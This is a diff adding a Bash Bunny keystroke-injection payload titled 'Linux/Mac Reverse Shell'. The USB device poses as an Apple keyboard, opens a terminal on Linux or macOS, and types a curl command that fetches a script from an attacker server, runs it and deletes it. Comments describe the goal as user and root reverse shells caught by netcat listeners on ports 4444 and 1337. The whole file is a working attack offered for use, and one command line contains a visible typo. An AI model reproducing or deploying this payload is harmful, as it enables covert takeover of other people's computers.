@@ -1,0 +1,67 @@
+#!/bin/bash
+
+# Since i dont have a bash bunny i only have digispark, i have converted this script to bash bunny
+# If any issues put in git i will fix it
+
+#POC DIGISPARK LINK : https://drive.google.com/open?id=1DvKX8QXHImVRZMaoTvmtreFkiL4rwYF-
+
+# Special thanks to sudobackdoor for bash script sample
+
+# Dont forgot to change IP in payload.sh
+
+
+# Title:         Linux/Mac Reverse Shell
+# Author:        Darkprince(Sridhar)
+# Version:       1.0
+#
+# Runs a script in the background that gives a user shell initially and waits for user to
+# escalate privileges and give a root reverse shell
+#
+# Magenta..................Setup
+# Red,Green,Blue......Executing
+# Green....................Finished
+
+#Before using this payload don't forgot to start netcat listeners on port 4444 and 1337
+#Because it gives both user shell and root shell
+
+# INITIALIZING
+LED M
+# Mac keyboard works in linux and mac
+ATTACKMODE  HID VID_0X05AC PID_0X021E
+
+LANGUAGE='us'
+
+# ATTACKING
+LED R G B
+
+#Get linux,mac Termial
+RUN UNITY xterm
+QUACK DELAY 1000
+#To close opened window by linux run command
+QUACK GUI Q
+RUN OSX terminal
+QUACK DELAY 1000
+
+#If linux then clearing 'terminal' which is typed by mac run script
+QUACK BACKSPACE
+QUACK BACKSPACE
+QUACK BACKSPACE
+QUACK BACKSPACE
+QUACK BACKSPACE
+QUACK BACKSPACE
+QUACK BACKSPACE
+QUACK BACKSPACE
+
+# Downloading bash script from server and Executing bash script which is same for mac and linux
+QUACK SRTING curl http://SERVER_IP/payload.sh -o payload.sh && bash payload.sh && rm payload.sh
+QUACK DELAY 200
+QUACK ENTER
+
+# The cleanup process will done by bash script
+# Closing the xterm in linux
+QUACK STRING exit
+# Closing the terminal in mac even if terminal has other process COMMAND Q and ENTER key will terminates terminal
+QUACK GUI Q
+QUACK ENTER
+
+LED G
